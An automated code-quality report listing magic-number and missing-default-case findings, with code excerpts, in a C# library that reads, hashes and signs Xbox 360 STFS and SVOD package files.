Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: try {  	DJsIO xio = new DJsIO (true);  	xHeaderData.Write (ref xio);  	xio.SetLength (0xB000);  	xio.Position = 0x340;  	xio.Write ((uint)0xAD0E);  	xio.Position = 0x379;  	xio.Write (new byte[] {  		0x24'  		5'  		5'  		0x11  	});  	IO.Position = 0x37D;  	xio.Write (IO.ReadBytes (20));  	xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  	xio.WriteUInt24 (xBlockCount);  	xio.Write (xDeviation);  	xio.Flush ();  	xio.Position = 0x344;  	byte[] xHash = SHA1Quick.ComputeHash (xio.ReadBytes ((int)(xio.Length - 0x344)));  	xio.Position = 0x32C;  	xio.Write (xHash);  	xio.Flush ();  	xio.Position = 0x22C;  	xHash = SHA1Quick.ComputeHash (xio.ReadBytes (0x118));  	xio.Position = 4;  	if (xParams.Type == PackageMagic.CON) {  		xio.Write (xParams.Certificate);  		xio.Write (ScrambleMethods.StockScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)' true));  	}  	else {  		xio.Write (ScrambleMethods.DevScramble (RSAQuick.SignatureGenerate (xParams.RSAKeys' xHash)));  		xio.Write (new byte[0x128]);  	}  	xio.IsBigEndian = true;  	xio.Position = 0;  	xio.Write (((uint)xParams.Type));  	xio.Flush ();  	xHeaderData.xMagic = xParams.Type;  	IO.Position = 0;  	IO.Write (xio.ReadStream ());  	IO.Flush ();  	xio.Dispose ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write (new byte[] {  	0x24'  	5'  	5'  	0x11  });  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write (IO.ReadBytes (20));  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Write ((byte)((xIsShifted ? 1 : 0) << 6));  
Magic Number,X360.SVOD,SVODPackage,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,xWriteHeader,The following statement contains a magic number: xio.Position = 4;  
Magic Number,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,formatstring,The following statement contains a magic number: if (i < 10)  	return "/Data000" + i.ToString ();  
Magic Number,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,formatstring,The following statement contains a magic number: if (i < 100)  	return "/Data00" + i.ToString ();  
Magic Number,X360.SVOD,SVODFuncs,C:\repos\mtolly_X360\X360\X360\SVOD\SVODPackage.cs,formatstring,The following statement contains a magic number: if (i < 1000)  	return "/Data0" + i.ToString ();  
Magic Number,X360.Security.Cryptography.Kerberos,KerbExtenz,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,NewConfounder,The following statement contains a magic number: for (int i = 0; i < 8; i++)  	xReturn [i] = (byte)xRand.Next (0' 0xFF);  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,CRC32,The following statement contains a magic number: for (uint i = 0; i < crctable.Length; i++) {  	crc = i;  	for (int j = 0; j < 8; j++) {  		if ((crc & 1) == 1)  			crc = (crc >> 1) ^ Polynomial;  		else  			crc >>= 1;  	}  	crctable [i] = (int)crc;  }  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,CRC32,The following statement contains a magic number: for (int j = 0; j < 8; j++) {  	if ((crc & 1) == 1)  		crc = (crc >> 1) ^ Polynomial;  	else  		crc >>= 1;  }  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,AddToCRC,The following statement contains a magic number: crc = (uint)(((crc >> 8) & bitsfilled) ^ crctable [(crc ^ xAdd) & 0xFF]);  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,AddToCRC,The following statement contains a magic number: foreach (byte x in xAdd)  	crc = (uint)(((crc >> 8) & bitsfilled) ^ crctable [(crc ^ x) & 0xFF]);  
Magic Number,X360.Security.Cryptography,CRC32,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,AddToCRC,The following statement contains a magic number: crc = (uint)(((crc >> 8) & bitsfilled) ^ crctable [(crc ^ x) & 0xFF]);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: if ((xPiece.Length % 8) != 0)  	throw new Exception ("Input not divisible by 8");  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < (xPiece.Length / 2); i += 8) {  	xStream.Position = i;  	byte[] xPart1 = xStream.ReadBytes (8);  	xStream.Position = (xPiece.Length - i - 8);  	byte[] xPart2 = xStream.ReadBytes (8);  	xStream.Position = i;  	xStream.Write (xPart2);  	xStream.Position = (xPiece.Length - i - 8);  	xStream.Write (xPart1);  	xStream.Flush ();  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: i += 8
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: xStream.Position = (xPiece.Length - i - 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: xStream.Position = (xPiece.Length - i - 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: if (xReverse)  	for (int i = 0; i < xPiece.Length; i += 8)  		Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: if (xReverse)  	for (int i = 0; i < xPiece.Length; i += 8)  		Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += 8)  	Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += 8)  	Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: i += 8
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,StockScramble,The following statement contains a magic number: Array.Reverse (xPiece' i' 8);  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if ((xPiece.Length % 8) != 0)  	throw new Exception ("Input not divisible by 8");  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += xCurrent) {  	Array.Reverse (xPiece' i' xSpot);  	xCurrent = xSpot;  	if (xSpot == 5)  		xSpot = 3;  	else  		xSpot = 5;  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += xCurrent) {  	Array.Reverse (xPiece' i' xSpot);  	xCurrent = xSpot;  	if (xSpot == 5)  		xSpot = 3;  	else  		xSpot = 5;  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: for (int i = 0; i < xPiece.Length; i += xCurrent) {  	Array.Reverse (xPiece' i' xSpot);  	xCurrent = xSpot;  	if (xSpot == 5)  		xSpot = 3;  	else  		xSpot = 5;  }  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if (xSpot == 5)  	xSpot = 3;  else  	xSpot = 5;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if (xSpot == 5)  	xSpot = 3;  else  	xSpot = 5;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: if (xSpot == 5)  	xSpot = 3;  else  	xSpot = 5;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: xSpot = 3;  
Magic Number,X360.Security.Cryptography,ScrambleMethods,C:\repos\mtolly_X360\X360\X360\Security\Cryptography.cs,DJScramble,The following statement contains a magic number: xSpot = 5;  
Missing Default,X360.STFS,BlockRecord,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,Switch,The following switch statement is missing a default case: switch (AllocationFlag) {  case HashFlag.Unallocated:  	Flags = (uint)((1 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedFree:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseOld:  	Flags = (uint)((3 << 30) | BlocksFree << 15);  	return true;  case HashFlag.AllocatedInUseCurrent:  	Flags = (uint)((2 << 30) | BlocksFree << 15);  	return true;  }  
Missing Default,X360.STFS,STFSDescriptor,C:\repos\mtolly_X360\X360\X360\STFS\STFSDescriptor.cs,GenerateHashOffset,The following switch statement is missing a default case: switch (xTree) {  case TreeLevel.L0:  	xReturn += (0x18 * (xBlock % BlockLevel [0]));  	break;  case TreeLevel.L1:  	xReturn += (0x18 * ((xBlock / BlockLevel [0]) % BlockLevel [0]));  	break;  case TreeLevel.L2:  	xReturn += (0x18 * ((xBlock / BlockLevel [1]) % BlockLevel [0]));  	break;  }  
Missing Default,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,VerifySignature,The following switch statement is missing a default case: switch (xHeader.Magic) {  case PackageMagic.CON:  	// signature is the same way for both Dev and Stock  	{  		xSigSpot = 0x1AC;  		xIO.Position = 0x28;  		xRSAKeyz.Exponent = xIO.ReadBytes (4);  		xRSAKeyz.Modulus = ScrambleMethods.StockScramble (xIO.ReadBytes (0x80)' false);  	}  	break;  case PackageMagic.LIVE:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				1'  				0'  				1  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK1;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xLK = new DJsIO (global::X360.Properties.Resources.XK4' true);  			xRSAKeyz.Modulus = xLK.ReadBytes (0x100);  			xLK.Close ();  		}  	}  	break;  case PackageMagic.PIRS:  	{  		xSigSpot = 4;  		if (!xDev) {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			xRSAKeyz.Modulus = global::X360.Properties.Resources.XK2;  		}  		else {  			xRSAKeyz.Exponent = new byte[] {  				0'  				0'  				0'  				3  			};  			DJsIO xPK = new DJsIO (global::X360.Properties.Resources.XK5' true);  			xRSAKeyz.Modulus = xPK.ReadBytes (0x100);  			xPK.Close ();  		}  	}  	break;  }  
